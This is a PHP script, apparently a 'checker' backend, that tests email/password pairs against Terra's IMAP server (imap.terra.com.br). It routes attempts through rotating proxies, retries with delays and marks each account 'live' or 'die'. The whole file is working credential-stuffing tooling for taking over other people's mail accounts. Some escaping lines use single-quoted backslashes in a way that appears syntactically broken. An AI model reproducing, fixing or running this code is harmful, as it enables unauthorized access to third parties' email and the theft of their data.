<?php
// Reescrito usando apenas aspas simples e array()
// para evitar conversao de caracteres no GitHub

while (ob_get_level() > 0) { @ob_end_clean(); }
ob_start();

error_reporting(0);
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
ini_set('log_errors', '0');
ini_set('max_execution_time', '120');

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = isset($_GET['action']) ? $_GET['action'] : '';

// =========================================
//  INIT
// =========================================
if ($action === 'init') {
    $proxies = array();
    $proxyFile = __DIR__ . '/proxies.txt';
    if (file_exists($proxyFile)) {
        $content = @file_get_contents($proxyFile);
        $lines = array_filter(array_map('trim', explode("\n", $content)));
        foreach ($lines as $line) {
            if (empty($line) || $line[0] === '#') continue;
            $proxies[] = $line;
        }
    }
    ob_end_clean();
    echo json_encode(array('status' => 'ok', 'proxies' => array_values(array_unique($proxies))));
    exit;
}

// =========================================
//  TEST_PROXY
// =========================================
if ($action === 'test_proxy') {
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($proxy)) {
        ob_end_clean();
        echo json_encode(array('status' => 'fail'));
        exit;
    }
    $ok = testProxy($proxy);
    ob_end_clean();
    echo json_encode(array('status' => $ok ? 'ok' : 'fail'));
    exit;
}

// =========================================
//  DIAG_PROXY
// =========================================
if ($action === 'diag_proxy') {
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($proxy)) {
        ob_end_clean();
        echo json_encode(array('status' => 'fail', 'msg' => 'Proxy vazio'));
        exit;
    }
    $p = parseProxy($proxy);
    $diag = array('proxy' => $proxy, 'parsed' => $p, 'tests' => array());

    // Test 1: TCP
    $t0 = microtime(true);
    $sock = @fsockopen($p['host'], $p['port'], $errno, $errstr, 10);
    $diag['tests']['tcp'] = array(
        'ok' => $sock !== false,
        'time_ms' => round((microtime(true) - $t0) * 1000),
        'err' => $sock === false ? sprintf('%s (%d)', $errstr, $errno) : null,
    );
    if ($sock) fclose($sock);

    // Test 2: HTTPS via cURL
    $t0 = microtime(true);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    if (!empty($p['user'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
    $res = curl_exec($ch);
    $diag['tests']['https_curl'] = array(
        'ok' => $res !== false,
        'ip' => $res !== false ? trim($res) : null,
        'time_ms' => round((microtime(true) - $t0) * 1000),
        'err' => curl_error($ch),
        'errno' => curl_errno($ch),
    );
    curl_close($ch);

    // Test 3: HTTP CONNECT manual
    $diag['tests']['http_connect_manual'] = testManualConnect($proxy, 20);

    ob_end_clean();
    echo json_encode($diag, JSON_PRETTY_PRINT);
    exit;
}

// =========================================
//  CHECK
// =========================================
if ($action === 'check') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($email) || empty($password)) {
        ob_end_clean();
        echo json_encode(array('status' => 'die', 'email' => $email, 'reason' => 'Vazio'));
        exit;
    }
    try {
        $result = doValidate($email, $password, $proxy);
    } catch (\Throwable $e) {
        $result = array('status' => 'die', 'email' => $email, 'reason' => 'Erro');
    }
    ob_end_clean();
    echo json_encode($result);
    exit;
}

ob_end_clean();
echo json_encode(array('status' => 'ok'));
exit;

// =========================================
//  PARSE PROXY
// =========================================
function parseProxy($proxy) {
    $host = '';
    $port = 0;
    $user = '';
    $pass = '';

    if (preg_match('#^(socks[45]h?|https?)://([^:@]+):([^@]+)@([^:]+):(\d+)$#i', $proxy, $m)) {
        $user = $m[2]; $pass = $m[3]; $host = $m[4]; $port = (int)$m[5];
    } elseif (preg_match('#^([^:@]+):([^@]+)@([^:]+):(\d+)$#', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    } elseif (preg_match('#^(socks[45]h?|https?)://([^:]+):(\d+)$#i', $proxy, $m)) {
        $host = $m[2]; $port = (int)$m[3];
    } elseif (preg_match('#^([^:]+):(\d+)$#', $proxy, $m)) {
        $host = $m[1]; $port = (int)$m[2];
    }

    return array('host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass);
}

// =========================================
//  TEST PROXY
// =========================================
function testProxy($proxy) {
    if (!extension_loaded('curl')) return false;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return false;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    if (!empty($p['user'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
    $result = curl_exec($ch);
    curl_close($ch);
    return ($result !== false && strlen(trim($result)) > 0);
}

// =========================================
//  DO VALIDATE
// =========================================
function doValidate($email, $password, $proxy) {
    $timeout = 20;
    $delays = array(0, 2000000, 4000000, 7000000, 10000000);

    for ($attempt = 0; $attempt < 5; $attempt++) {
        if ($delays[$attempt] > 0) usleep($delays[$attempt]);

        if (!empty($proxy)) {
            // Metodo 1: cURL com proxy
            if (extension_loaded('curl')) {
                $r = tryCurlProxy($email, $password, $timeout, $proxy);
                if ($r !== null) return $r;
            }
            // Metodo 2: HTTP CONNECT manual
            $r = tryHttpConnectManual($email, $password, $timeout, $proxy);
            if ($r !== null) return $r;
        } else {
            // Sem proxy
            if (extension_loaded('curl')) {
                $r = tryCurlDirect($email, $password, $timeout);
                if ($r !== null) return $r;
            }
            $r = trySocketDirect($email, $password, $timeout);
            if ($r !== null) return $r;
        }
    }

    return array('status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true);
}

// =========================================
//  cURL COM PROXY
// =========================================
function tryCurlProxy($email, $password, $timeout, $proxy) {
    $p = parseProxy($proxy);
    if (empty($p['host'])) return null;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
    curl_setopt($ch, CURLOPT_USERNAME, $email);
    curl_setopt($ch, CURLOPT_PASSWORD, $password);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    if (!empty($p['user'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }

    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);

    if ($errno === 67) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if ($result !== false) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    return null;
}

// =========================================
//  HTTP CONNECT MANUAL + TLS + IMAP
// =========================================
function tryHttpConnectManual($email, $password, $timeout, $proxy) {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) return null;

    // 1. TCP ao proxy
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) return null;

    stream_set_timeout($socket, $timeout);
    stream_set_blocking($socket, true);

    // 2. HTTP CONNECT
    $target = 'imap.terra.com.br';
    $req = 'CONNECT ' . $target . ':993 HTTP/1.1' . "\r\n";
    $req .= 'Host: ' . $target . ':993' . "\r\n";
    $req .= 'User-Agent: Mozilla/5.0' . "\r\n";
    if (!empty($p['user'])) {
        $auth = base64_encode($p['user'] . ':' . $p['pass']);
        $req .= 'Proxy-Authorization: Basic ' . $auth . "\r\n";
    }
    $req .= 'Proxy-Connection: Keep-Alive' . "\r\n";
    $req .= "\r\n";

    fwrite($socket, $req);

    // 3. Ler resposta HTTP
    $resp = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $resp .= $line;
        if ($line === "\r\n" || $line === "\n") break;
    }

    if (stripos($resp, '200') === false) {
        fclose($socket);
        return null;
    }

    // 4. TLS
    $cryptoOk = false;
    $deadline2 = microtime(true) + $timeout;
    while (microtime(true) < $deadline2) {
        $r = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
        if ($r === true) { $cryptoOk = true; break; }
        if ($r === false) break;
        usleep(100000);
    }

    if (!$cryptoOk) {
        fclose($socket);
        return null;
    }

    // 5. IMAP greeting
    $greeting = '';
    $deadline3 = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline3) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $greeting .= $line;
        if (strpos($line, "\n") !== false) break;
    }

    if (stripos($greeting, 'OK') === false) {
        fclose($socket);
        return null;
    }

    // 6. IMAP LOGIN
    $safe_email = str_replace(array('\', '"'), array('\\', '\"'), $email);
    $safe_pass = str_replace(array('\', '"'), array('\\', '\"'), $password);
    $login_cmd = 'A1 LOGIN "' . $safe_email . '" "' . $safe_pass . "\"\r\n";
    fwrite($socket, $login_cmd);

    // 7. Ler resposta
    $imapResp = '';
    $deadline4 = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $imapResp .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline4) break;
    }

    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);

    if (preg_match('/A1\s+OK/i', $imapResp)) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    if (preg_match('/A1\s+NO/i', $imapResp)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if (preg_match('/A1\s+BAD/i', $imapResp)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    return null;
}

// =========================================
//  TESTE MANUAL (diag)
// =========================================
function testManualConnect($proxy, $timeout) {
    $p = parseProxy($proxy);
    if (empty($p['host']) || empty($p['port'])) {
        return array('ok' => false, 'err' => 'Parse failed');
    }

    $t0 = microtime(true);
    $socket = @fsockopen($p['host'], $p['port'], $errno, $errstr, $timeout);
    if ($socket === false) {
        return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => sprintf('fsockopen: %s (%d)', $errstr, $errno));
    }
    stream_set_timeout($socket, $timeout);

    $target = 'imap.terra.com.br';
    $req = 'CONNECT ' . $target . ':993 HTTP/1.1' . "\r\n" . 'Host: ' . $target . ':993' . "\r\n";
    if (!empty($p['user'])) {
        $auth = base64_encode($p['user'] . ':' . $p['pass']);
        $req .= 'Proxy-Authorization: Basic ' . $auth . "\r\n";
    }
    $req .= "\r\n";
    fwrite($socket, $req);

    $resp = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $resp .= $line;
        if ($line === "\r\n" || $line === "\n") break;
    }

    if (stripos($resp, '200') === false) {
        fclose($socket);
        return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'CONNECT rejected', 'response' => substr($resp, 0, 300));
    }

    $tls = false;
    $deadline2 = microtime(true) + $timeout;
    while (microtime(true) < $deadline2) {
        $r = @stream_socket_enable_crypto($socket, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
        if ($r === true) { $tls = true; break; }
        if ($r === false) break;
        usleep(100000);
    }

    if (!$tls) {
        fclose($socket);
        return array('ok' => false, 'time_ms' => round((microtime(true) - $t0) * 1000), 'err' => 'TLS handshake failed');
    }

    $greeting = '';
    $deadline3 = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline3) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $greeting .= $line;
        if (strpos($line, "\n") !== false) break;
    }
    fclose($socket);

    $timeMs = round((microtime(true) - $t0) * 1000);

    if (stripos($greeting, 'OK') === false) {
        return array('ok' => false, 'time_ms' => $timeMs, 'err' => 'No IMAP greeting', 'greeting' => substr($greeting, 0, 200));
    }

    return array('ok' => true, 'time_ms' => $timeMs, 'greeting' => substr($greeting, 0, 200));
}

// =========================================
//  cURL DIRETO
// =========================================
function tryCurlDirect($email, $password, $timeout) {
    if (!extension_loaded('curl')) return null;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
    curl_setopt($ch, CURLOPT_USERNAME, $email);
    curl_setopt($ch, CURLOPT_PASSWORD, $password);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);
    if ($errno === 67) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if ($result !== false) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    return null;
}

// =========================================
//  SOCKET DIRETO
// =========================================
function trySocketDirect($email, $password, $timeout) {
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    $greeting = @fgets($socket, 8192);
    if (!$greeting || stripos($greeting, 'OK') === false) {
        fclose($socket);
        return null;
    }
    $safe_email = addslashes($email);
    $safe_pass = addslashes($password);
    $cmd = 'A1 LOGIN "' . $safe_email . '" "' . $safe_pass . "\"\r\n";
    fwrite($socket, $cmd);
    $response = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) break;
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline) break;
    }
    @fwrite($socket, "A2 LOGOUT\r\n");
    fclose($socket);
    if (preg_match('/A1\s+OK/i', $response)) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    if (preg_match('/A1\s+NO/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if (preg_match('/A1\s+BAD/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    return null;
}
